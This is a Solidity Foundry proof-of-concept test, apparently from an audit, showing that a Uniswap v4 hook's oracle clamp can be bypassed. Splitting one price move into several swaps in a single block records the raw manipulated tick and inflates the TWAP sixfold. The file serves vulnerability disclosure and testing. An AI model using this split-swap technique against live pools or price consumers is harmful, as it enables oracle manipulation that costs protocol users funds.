// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

import {IBCTokenFactory} from "src/interfaces/IBCTokenFactory.sol";

import {HookAddressMiner} from "script/utils/HookAddressMiner.sol";
import {MockTokenFactory} from "test/FactoryHookUnit.t.sol";
import {DeployV4Infra} from "test/helpers/DeployV4Infra.sol";
import {ERC20Mock} from "test/helpers/ERC20Mock.sol";
import {FactoryHookHarness} from "test/helpers/FactoryHookHarness.sol";
import {MockStakingVault, MockStakingVaultFactory} from "test/helpers/ProtocolMocks.sol";

/// @title PoC_H29_TruncatedOraclePerObservationClamp
/// @notice Harm assertion for H-29: `FactoryHook`'s truncated-tick oracle clamps the recorded
/// tick by `MAX_ABS_TICK_MOVE` **per invocation of `_updateVolatility`**, and `_updateVolatility`
/// is called unconditionally from `_beforeSwap` on EVERY swap
/// (`src/hook/FactoryHook.sol:387`). Nothing compares `state.lastSwapTimestamp` to
/// `block.timestamp` before applying the clamp, so the attacker chooses how many observations
/// occur in a block. Splitting one swap into N swaps in the same block moves the recorded tick
/// by N * MAX_ABS_TICK_MOVE, defeating the damping advertised at
/// `src/interfaces/IFactoryHook.sol:281-291`.
contract PoC_H29_TruncatedOraclePerObservationClamp is Test, DeployV4Infra {
    uint160 internal constant HOOK_FLAGS = 0x30CC;

    FactoryHookHarness internal hook;
    MockTokenFactory internal tokenFactory;
    MockStakingVaultFactory internal stakingVaultFactory;
    ERC20Mock internal coin;
    PoolKey internal key;
    PoolId internal poolId;

    address internal owner = makeAddr("owner");

    /// @dev The tick an attacker pushes the pool to inside a single block. Deliberately
    /// 6 * MAX_ABS_TICK_MOVE so the "damped" and "undamped" outcomes differ by exactly 6x.
    int24 internal constant MANIPULATED_TICK = 54_696; // 6 * 9116
    uint256 internal constant SPLITS = 6;
    uint256 internal constant TWAP_WINDOW = 600; // seconds observed after the manipulation block

    receive() external payable {}

    function setUp() public virtual {
        deployV4Infra();

        tokenFactory = new MockTokenFactory(owner, address(this));
        stakingVaultFactory = new MockStakingVaultFactory(owner, address(0), address(weth));
        coin = new ERC20Mock("Coin", "COIN", 18);

        bytes memory constructorArgs =
            abi.encode(poolManager, address(tokenFactory), address(weth), address(stakingVaultFactory));
        (address predictedHook, bytes32 salt) =
            HookAddressMiner.find(address(this), HOOK_FLAGS, type(FactoryHookHarness).creationCode, constructorArgs);
        hook = new FactoryHookHarness{salt: salt}(
            poolManager, address(tokenFactory), address(weth), address(stakingVaultFactory)
        );
        assertEq(address(hook), predictedHook);

        vm.prank(owner);
        stakingVaultFactory.setHook(address(hook));

        key = PoolKey({
            currency0: CurrencyLibrary.ADDRESS_ZERO,
            currency1: Currency.wrap(address(coin)),
            fee: 500,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });
        poolId = key.toId();

        hook.registerPool(
            key,
            address(coin),
            0,
            IBCTokenFactory.StakingConfig({deployStaking: false, alternativeFeeRecipient: address(0)}),
            bytes("")
        );

        // Anchor the oracle at tick 0 in a settled block before the attack block. A full swap
        // cycle (beforeSwap accrue + afterSwap checkpoint) leaves both the reference tick and the
        // recorded oracle tick at 0.
        vm.warp(1_000_000);
        hook.exposed_swapCycle(poolId, 0, 0);
        (, int24 anchored) = hook.observe(poolId);
        assertEq(anchored, int24(0), "oracle anchored at tick 0");
    }

    /// @notice BASELINE: with ONE observation in the manipulation block, the clamp works as
    /// advertised - the recorded tick moves at most MAX_ABS_TICK_MOVE.
    function test_H29_Baseline_SingleObservationIsClamped() public {
        vm.warp(block.timestamp + 12); // the manipulation block

        hook.exposed_checkpointSwap(poolId, MANIPULATED_TICK);

        (, int24 recorded) = hook.observe(poolId);
        assertEq(recorded, hook.MAX_ABS_TICK_MOVE(), "one observation moves the tick by exactly the cap");
        assertLt(int256(recorded), int256(MANIPULATED_TICK), "the raw manipulated tick is NOT recorded");
    }

    /// @notice HARM: the SAME price move, in the SAME single block, split into N swaps moves the
    /// recorded oracle tick by N * MAX_ABS_TICK_MOVE - all the way to the raw manipulated tick.
    /// The advertised single-block damping provides ZERO protection.
    function test_H29_SplitSwapsInOneBlockDefeatTheClamp() public {
        vm.warp(block.timestamp + 12); // the manipulation block
        uint256 attackBlockTimestamp = block.timestamp;

        for (uint256 i; i < SPLITS; ++i) {
            // No vm.warp between iterations: every observation happens in ONE block, exactly as
            // N swaps bundled into one transaction/bundle would.
            hook.exposed_checkpointSwap(poolId, MANIPULATED_TICK);
        }
        assertEq(block.timestamp, attackBlockTimestamp, "all observations occurred in a single block");

        (, int24 recorded) = hook.observe(poolId);

        // HARM 1: the recorded tick moved 6x the advertised per-block bound, inside one block.
        assertEq(recorded, MANIPULATED_TICK, "HARM: recorded tick equals the RAW manipulated tick");
        assertGt(int256(recorded), int256(hook.MAX_ABS_TICK_MOVE()), "HARM: single-block move exceeds the cap");
        assertEq(
            int256(recorded),
            int256(hook.MAX_ABS_TICK_MOVE()) * int256(SPLITS),
            "HARM: movement scales linearly with the attacker-chosen observation count"
        );
    }

    /// @notice HARM (downstream): the manipulated tick is what accrues into `tickCumulative`
    /// after the attack block, so any consumer deriving a TWAP as (cum2-cum1)/(t2-t1) over the
    /// following window reads a 6x-inflated average tick versus the damped path.
    function test_H29_ManipulatedTickPoisonsTheDownstreamTwap() public {
        // ---- Path A: honest single observation (the damped reference outcome). ----
        uint256 snapshot = vm.snapshot();

        vm.warp(block.timestamp + 12);
        hook.exposed_checkpointSwap(poolId, MANIPULATED_TICK);
        (int56 cumA1,) = hook.observe(poolId);
        vm.warp(block.timestamp + TWAP_WINDOW);
        (int56 cumA2,) = hook.observe(poolId);
        int256 twapDamped = (int256(cumA2) - int256(cumA1)) / int256(TWAP_WINDOW);

        // ---- Path B: the SAME block, the SAME end price, split into N swaps. ----
        vm.revertTo(snapshot);

        vm.warp(block.timestamp + 12);
        for (uint256 i; i < SPLITS; ++i) {
            hook.exposed_checkpointSwap(poolId, MANIPULATED_TICK);
        }
        (int56 cumB1,) = hook.observe(poolId);
        vm.warp(block.timestamp + TWAP_WINDOW);
        (int56 cumB2,) = hook.observe(poolId);
        int256 twapSplit = (int256(cumB2) - int256(cumB1)) / int256(TWAP_WINDOW);

        assertEq(twapDamped, int256(hook.MAX_ABS_TICK_MOVE()), "damped path: TWAP is capped at one step");
        // HARM: identical block, identical final price - but the TWAP a consumer reads is 6x higher.
        assertEq(twapSplit, int256(MANIPULATED_TICK), "HARM: split path TWAP tracks the raw manipulated tick");
        assertEq(twapSplit, twapDamped * int256(SPLITS), "HARM: TWAP damping is defeated in exact proportion to splits");
    }
}
